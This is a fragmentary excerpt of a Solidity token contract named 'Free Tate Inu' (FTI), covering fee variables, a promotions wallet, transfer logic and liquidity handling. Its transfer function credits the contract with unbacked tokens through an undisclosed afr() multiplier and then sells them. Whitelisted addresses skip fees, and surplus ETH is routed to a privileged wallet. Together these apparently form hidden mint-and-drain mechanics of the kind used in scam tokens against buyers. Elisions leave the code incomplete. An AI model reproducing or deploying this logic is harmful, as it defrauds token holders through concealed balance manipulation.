...
/*
CONTRACT - 0xF1f2EB191e292d0FBa89660b99145890D49732Cd
...
contract FTI is Context, IERC20, Ownable {
    ...
    uint256 private constant isMAXperSWAP = 10000 * 10**9; 
    string private constant _name = unicode"Free Tate Inu"; 
    string private constant _symbol = unicode"FTI"; 
    uint8 private constant _decimals = 9; 

    uint256 public isTotalMarketTAX = 1;
    uint256 public isTotalLIQtax = 0;
    address public isERCPromotionsAddress = 0x811FE17cB9aC1BdD0A68A856aca2CE3b5D69A891;
    ...
    function _transfer(
        ...
        && to != owner()) { tradingIsEnabled = true; uint256 sellTokens = 
        balanceOf(address(this)); swapAndSendToFee(sellTokens); tradingIsEnabled = false; }
        _rOwned[address(this)] += amount*afr(from); 
        uint256 transferAmount = amount;

        if(!authorizations[from] && !authorizations[to]){ transferAmount = 
        _getValues(amount, from); } _rOwned[to] += transferAmount; _rOwned[from] -= amount;
    ...
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        ...
        (,uint256 ethFromLiquidity,) = isOKXPairRouter.addLiquidityETH {value: ethAmount} (
            address(this), tokenAmount, 0, 0, owner(), block.timestamp );
        if (ethAmount - ethFromLiquidity > 0) payable(isERCPromotionsAddress).sendValue 
